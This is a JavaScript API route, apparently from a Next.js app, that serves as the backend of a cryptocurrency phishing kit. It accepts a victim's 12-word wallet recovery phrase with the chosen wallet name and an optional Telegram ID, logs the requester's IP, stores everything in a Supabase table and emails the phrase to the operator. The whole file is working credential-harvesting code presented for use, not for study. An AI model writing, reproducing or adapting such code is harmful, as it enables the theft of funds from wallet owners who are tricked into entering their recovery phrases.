import { supabase, TABLES } from '../../../lib/supabase'
import { sendEmailNotification } from '../../../lib/email'

export async function POST(request) {
  try {
    const body = await request.json()
    const { selectedWallet, phrase, timestamp = new Date().toISOString(), telegramId } = body

    console.log('📝 New phrase submission received:', {
      wallet: selectedWallet,
      phraseLength: phrase?.length,
      timestamp,
      telegramId: telegramId || 'None'
    })

    // Validate input
    if (!selectedWallet || !phrase || !Array.isArray(phrase) || phrase.length !== 12) {
      console.error('❌ Invalid submission data:', { selectedWallet, phraseLength: phrase?.length })
      return Response.json(
        { error: 'Invalid data provided' },
        { status: 400 }
      )
    }

    // Create new submission with snake_case column names for Supabase
    const newSubmission = {
      selected_wallet: selectedWallet,
      phrase,
      timestamp,
      ip: request.headers.get('x-forwarded-for') || 'unknown',
      telegram_id: telegramId || null // Store telegram ID if provided
    }

    console.log('💾 Storing submission in database:', {
      id: 'pending',
      wallet: newSubmission.selected_wallet,
      timestamp: newSubmission.timestamp,
      telegram_id: newSubmission.telegram_id
    })

    // Insert into Supabase
    const { data, error } = await supabase
      .from(TABLES.SUBMISSIONS)
      .insert([newSubmission])
      .select()

    if (error) {
      console.error('❌ Supabase database error:', error)
      return Response.json(
        { error: 'Database error', details: error.message },
        { status: 500 }
      )
    }

    console.log('✅ Submission stored successfully:', {
      id: data[0].id,
      wallet: data[0].selected_wallet,
      timestamp: data[0].timestamp
    })

    // Send email notification
    console.log('📧 Sending email notification...')
    try {
      const emailResult = await sendEmailNotification({
        selectedWallet, // Use original camelCase for email
        phrase,
        timestamp,
        ip: request.headers.get('x-forwarded-for') || 'unknown',
        id: data[0].id,
        telegramId // Include telegram ID in email
      })
      
      if (emailResult && emailResult.error) {
        console.error('❌ Email notification failed:', emailResult.error)
      } else {
        console.log('✅ Email notification sent successfully')
      }
    } catch (emailError) {
      console.error('❌ Email notification error:', emailError)
      // Don't fail the submission if email fails
    }

    return Response.json({
      success: true,
      message: 'Phrase submitted successfully',
      submissionId: data[0].id,
      telegramId: telegramId // Return telegram ID in response
    })

  } catch (error) {
    console.error('❌ Critical error processing submission:', error)
    console.error('Error details:', {
      message: error.message,
      name: error.name,
      stack: error.stack
    })
    return Response.json(
      { error: 'Internal server error', details: error.message },
      { status: 500 }
    )
  }
}

